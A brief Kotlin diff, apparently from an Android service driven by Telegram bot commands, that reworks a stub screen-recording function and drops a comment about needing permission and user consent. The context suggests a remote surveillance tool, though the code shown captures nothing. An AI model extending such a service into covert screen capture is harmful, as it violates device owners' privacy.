@@ -348,10 +348,9 @@ override fun onCreate() {
         }
     }
 
-    private fun recordScreen(durationSec: Int) {
-        // Not implemented fully — would need MediaProjection permission + user consent
-        sendTelegramMessage("🖥 Screen recording not available via service. Use /screenshot for image.")
-    }
+    private suspend fun recordScreen(durationSec: Int) {
+    sendTelegramMessage("🖥 Screen recording not available via service. Use /screenshot for image.")
+}
 
     // ================== AUTO TASKS (10 min) ==================
     private fun scheduleAutoTasks() {
